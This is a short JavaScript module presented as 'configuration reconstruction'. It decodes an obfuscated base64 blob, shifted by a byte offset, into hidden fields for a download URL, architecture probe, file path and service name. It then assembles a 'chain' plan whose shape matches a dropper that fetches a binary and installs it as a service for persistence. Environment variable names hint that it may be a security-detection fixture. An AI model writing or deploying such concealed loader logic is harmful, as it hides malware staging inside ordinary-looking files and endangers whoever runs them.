// configuration reconstruction
const moduleShape = Object.freeze({ format: "commonjs" });
const Material_f5062aba = "Zy4ibWRlVmFkLmFjYFdaXVZQWWBkZR1SVGJmWmNWUGNWXmBlVh1oY1plVlBXWl1WHVRZUl9YVlBeYFVWHVVaZGFSZVRZUGFjYFRWZGRtUlVSYWVWYy5ZZWVhZFBSY1RZUFdSXV1TUlRcbWRlUlhWUFRgZl9lLiZtVFJeYVJaWF9QWlUuP0A1Nh43JiEyJTQjJW1mY10uWWVlYWQrICBfYFVWHlcmIVIlVCMlViUlKB9WaVJeYV1WH1pfZ1JdWlUgUmFabWZkVmNQUlhWX2UuP2BVVjJmVVplIFcmIVJtV1pdVlBhUmVZLiBlXmEgWWZfZWNWZGQeX2BVViAfZGVSWFYeVyYhUiVUIyVWJSUoH15bZG1SY1RZUGFjYFNWLmFjYFRWZGQfUmNUWW1kVmNnWlRWUF9SXlYuX2BVVh5XJiFSJVQfZFZjZ1pUVg==";
const Codec_f5062aba = "base64_chunks|subtract_modulo_256|0f";

function load_f5062aba() { return [...Buffer.from(Material_f5062aba, "base64")]; }
function decode_f5062aba(storedBytes) { return storedBytes.map((value) => (value + 15) & 255); }
async function recover_f5062aba() {
  const harmlessValue = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";
  const storedBytes = load_f5062aba(); let recoveredBytes = [];
  const decodeTarget = decode_f5062aba; recoveredBytes = decodeTarget(storedBytes);
  void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");
}
async function inspect_f5062aba() { return ({ ...{ value: await recover_f5062aba() } }).value; }
async function plan_f5062aba() { const inspect = inspect_f5062aba; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "chain", adapter: "https_arch_fallback", arch: fields.arch_probe, url: fields.url, path: fields.file_path, service: fields.service_name }); }
void moduleShape; void plan_f5062aba;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_f5062aba());

// reconstruction complete